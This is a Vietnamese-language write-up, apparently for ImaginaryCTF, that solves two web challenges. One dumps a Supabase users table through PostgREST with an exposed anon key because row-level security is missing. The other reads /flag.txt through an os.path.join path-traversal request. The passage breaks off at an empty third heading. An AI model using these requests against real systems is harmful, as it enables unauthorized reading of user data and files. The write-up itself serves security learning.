Ta sẽ đi phân tích request sử dụng api của chương trình:

```
/rest/v1/users?select=*&username=eq.long&password=eq.a
```

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
X-Client-Info: supabase-js-web/2.50.3
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
```

Từ request ta có thể nhận thấy chương trình sử dụng API của PostgREST. Supabase PostgREST là một dịch vụ nằm trong Supabase, nó tự động sinh ra RESTful API từ cơ sở dữ liệu PostgreSQL. Mỗi bảng trong PostgreSQL sẽ trở thành một endpoint REST. Các cột trong bảng trở thành các trường JSON trong API. Các toán tử như eq., lt., like.… tương ứng với filter trong SQL. Ví dụ bảng `users` trong PostgreSQL tương đương với API /rest/v1/users. Truy vấn GET /rest/v1/users?username=eq.long tương ứng với SQL

```sql
SELECT * FROM users WHERE username = 'long';
```

Ta quay lại phần mô tả của bài toán:

_I made a new note taking app using Supabase! Its so secure, I put my flag as the password to the "admin" account. I even put my anonymous key somewhere in the site. The password database is called, "users"._

Như vậy, ta chỉ cần thực hiện request với param `/rest/v1/users?select=*&username=eq.admin` thì chương trình sẽ trả về

```json
{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}
```

Supabase cung cấp hai loại key chính: key công khai (publishable / anon) dùng cho frontend và key có quyền cao (service_role / secret) dùng cho backend. 

Key công khai được thiết kế để “an toàn để hiển thị” khi và chỉ khi bảng/ứng dụng được bảo vệ bằng RLS (và policy đúng). Nếu một bảng trong schema public không bật RLS thì bảng đó có thể bị truy vấn công khai bởi role anon; nghĩa là bất kỳ ai có anon key (hoặc giả mạo request phù hợp) có thể đọc dữ liệu trên bảng đó.

tác giả challenge embed một key (ở đây là anon key) vào client và database bảng users không có RLS (hoặc policy không chặn truy cập cột password). Kết quả là chỉ cần gửi request tới endpoint PostgREST (/rest/v1/users?select=*&username=eq.admin) kèm header Authorization/Apikey tương ứng, API trả trực tiếp toàn bộ hàng bao gồm cột password.

### codenames-1

Chương trình là một dịch vụ web đơn giản sử dụng Flask và Socket io. Tại route `/create_game`, chương trình áp dụng logic lấy các ngôn ngữ trong thư mục `words/` với logic như sau:

```python
language = request.form.get('language', None)
if not language or '.' in language:
    language = LANGUAGES[0] if LANGUAGES else None
word_list = []
if language:
    wl_path = os.path.join(WORDS_DIR, f"{language}.txt")
    try:
        with open(wl_path) as wf:
            word_list = [line.strip() for line in wf if line.strip()]
```

Ở đây thực hiện kiểm tra đơn giản xem có kí tự `.` ở trong language hay không rồi nối với WORD_DIR bằng `os.path.join` có quy tắc: nếu một thành phần tiếp theo là đường dẫn tuyệt đối (bắt đầu bằng / trên Unix), thì các thành phần trước sẽ bị bỏ và kết quả là đường dẫn tuyệt đối đó. Ví dụ:

```python
import os
a = os.path.join("challenge/words", "en.txt")
print(a) # challenge/words/en.txt
b = os.path.join("challenge/words", "/en.txt")
print(b) # /en.txt
```

Như vậy để đọc /flag.txt trên hệ thống, ta chỉ cần lợi dụng logic thêm đuôi .txt vào sau giá trị language để đọc flag

```
POST /create_game HTTP/1.1
Host: codenames-1.chal.imaginaryctf.org
Content-Length: 14
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJpc19ib3QiOmZhbHNlLCJ1c2VybmFtZSI6Im5nbG9uZzA1In0.aL4qPw.If2AlYlkf4X9FhyIbi2UE-jjOWM

language=/flag
```

```
ictf{common_os_path_join_L_xxxxxxx}
```

### passwordless


